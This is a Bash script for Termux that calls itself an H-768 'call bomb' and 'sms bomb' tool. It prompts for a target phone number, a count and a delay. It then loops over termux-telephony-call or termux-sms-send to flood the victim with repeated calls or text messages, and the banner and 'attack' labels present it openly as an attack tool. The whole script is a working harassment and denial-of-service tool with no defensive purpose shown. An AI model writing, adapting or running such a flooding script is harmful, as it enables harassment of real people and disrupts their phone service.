#!/bin/bash
clear 
a=1
echo -e "\e[1;32m 
           ⡆⣐⢕⢕⢕⢕⢕⢕⢕⢕⠅⢗⢕⢕⢕⢕⢕⢕⢕⠕⠕⢕⢕⢕⢕⢕⢕⢕⢕⢕
           ⢐⢕⢕⢕⢕⢕⣕⢕⢕⠕⠁⢕⢕⢕⢕⢕⢕⢕⢕⠅⡄⢕⢕⢕⢕⢕⢕⢕⢕⢕
           ⢕⢕⢕⢕⢕⠅⢗⢕⠕⣠⠄⣗⢕⢕⠕⢕⢕⢕⠕⢠⣿⠐⢕⢕⢕⠑⢕⢕⠵⢕
           ⢕⢕⢕⢕⠁⢜⠕⢁⣴⣿⡇⢓⢕⢵⢐⢕⢕⠕⢁⣾⢿⣧⠑⢕⢕⠄⢑⢕⠅⢕
           ⢕⢕⠵⢁⠔⢁⣤⣤⣶⣶⣶⡐⣕⢽⠐⢕⠕⣡⣾⣶⣶⣶⣤⡁⢓⢕⠄⢑⢅⢑
           ⠍⣧⠄⣶⣾⣿⣿⣿⣿⣿⣿⣷⣔⢕⢄⢡⣾⣿⣿⣿⣿⣿⣿⣿⣦⡑⢕⢤⠱⢐
           ⢠⢕⠅⣾⣿⠋⢿⣿⣿⣿⠉⣿⣿⣷⣦⣶⣽⣿⣿⠈⣿⣿⣿⣿⠏⢹⣷⣷⡅⢐
           ⣔⢕⢥⢻⣿⡀⠈⠛⠛⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⡀⠈⠛⠛⠁⠄⣼⣿⣿⡇⢔
           ⢕⢕⢽⢸⢟⢟⢖⢖⢤⣶⡟⢻⣿⡿⠻⣿⣿⡟⢀⣿⣦⢤⢤⢔⢞⢿⢿⣿⠁⢕
           ⢕⢕⠅⣐⢕⢕⢕⢕⢕⣿⣿⡄⠛⢀⣦⠈⠛⢁⣼⣿⢗⢕⢕⢕⢕⢕⢕⡏⣘⢕
           ⢕⢕⠅⢓⣕⣕⣕⣕⣵⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣷⣕⢕⢕⢕⢕⡵⢀⢕⢕
           ⢑⢕⠃⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⢕⢕⢕
           ⣆⢕⠄⢱⣄⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⢕⢕⠕⢁
           ⣿⣦⡀⣿⣿⣷⣶⣬⣍⣛⣛⣛⡛⠿⠿⠿⠛⠛⢛⣛⣉⣭⣤⣂⢜⠕⢑⣡⣴⣿
"
echo ""

echo -e "\e[1;32m        [________________ WE ARE H-768 ________________]"

echo ""
echo -e "\e[1;36m    < == [ Demon , Mr.Rabbit , Gr4Y , BR!N@n0 , ZED ] == >\e[0m"

echo ""
echo "1.call  bomb "
echo ""
echo "2.sms bomb"
echo ""
read -p "Enter Choose :: " z
if [[ $z == 1 ]];then
echo ""
read -p "Enter Trage Phone :: " p 
echo ""
read -p "Enter Number of calls :: " f 
echo ""
read -p "Enter Delay in sec (Put it above 30) :: " t

echo -e "\e[1;33m         Your are Trage :: $p"
echo ""
echo -e "\e[1;31m      <========= attack ========>"
echo ""
until [ $a == $f ] 
do 
echo " "
  echo -e "\e[
1;32m[ `date +"%T"` ] \e[1;36m[+]Number of Call Sent -->\e[0m" $a
  a=$(($a+1))
  termux-telephony-call $p
  sleep $t

        done
elif [[ $z == 2 ]];then
echo ""
read -p "Enter Trage phone :: " p
echo ""
read -p "Enter message :: " m
echo ""
read -p "Enter sead Number :: " f
echo ""
read -p "Enter Delay in sec (Put it above 10) :: " t
echo -e "\e[1;33m         Your are Trage :: $p"
echo ""
echo -e "\e[1;31m      <========= attack ========>"
echo ""
until [ $a == $f ] 
do 
echo " "
  echo -e "\e[
1;32m[ `date +"%T"` ] \e[1;36m[+]Number of sms Sent -->\e[0m" $a
  a=$(($a+1))
termux-sms-send -n $p $m
  sleep $t

        done
        fi
        
